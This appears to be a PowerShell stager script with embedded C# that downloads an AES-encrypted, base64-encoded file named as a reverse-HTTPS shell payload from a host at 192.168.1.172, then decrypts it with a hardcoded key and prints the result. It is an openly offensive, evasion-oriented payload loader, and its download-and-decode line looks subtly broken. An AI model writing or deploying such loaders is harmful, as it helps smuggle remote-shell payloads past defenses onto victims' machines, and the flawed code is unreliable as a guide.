# Add required .NET assemblies
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

public static class CryptoHelper
{
    private const string Key = "ff827540075736f397c113a5edcb5d93"; // AES key, must be 256 bits long (32 bytes)
    private const string Vector = "9c3c504fcb064a41"; // Initialization vector (IV), must be 128 bits long (16 bytes)

    public static byte[] DecryptBytes(byte[] cipherText)
    {
        byte[] keyArray = UTF8Encoding.UTF8.GetBytes(Key);
        byte[] ivArray = UTF8Encoding.UTF8.GetBytes(Vector);

        var rijndaelKey = new RijndaelManaged { Mode = CipherMode.CBC, Padding = PaddingMode.PKCS7 };
        var encryptor = rijndaelKey.CreateDecryptor(keyArray, ivArray);

        MemoryStream ms = new MemoryStream();
        using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
        {
            cs.Write(cipherText, 0, cipherText.Length);
        }

        return ms.ToArray();
    }
}
"@ -ErrorAction Stop

# Define URL of the web-hosted .txt file containing base64 encrypted string
$url = "http://192.168.1.172/files/attck-rev-https-aes.txt"

# Download the file and decode it into a byte array
$byteString = [System.Net.WebClient]::new().DownloadData($url) | ForEach-Object { [Convert]::FromBase64String($_) }

# Decrypt the byte string and output as a string
$decryptedBytes = [CryptoHelper]::DecryptBytes($byteString)
$decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes, 0, $decryptedBytes.Length)
Write-Output $decryptedString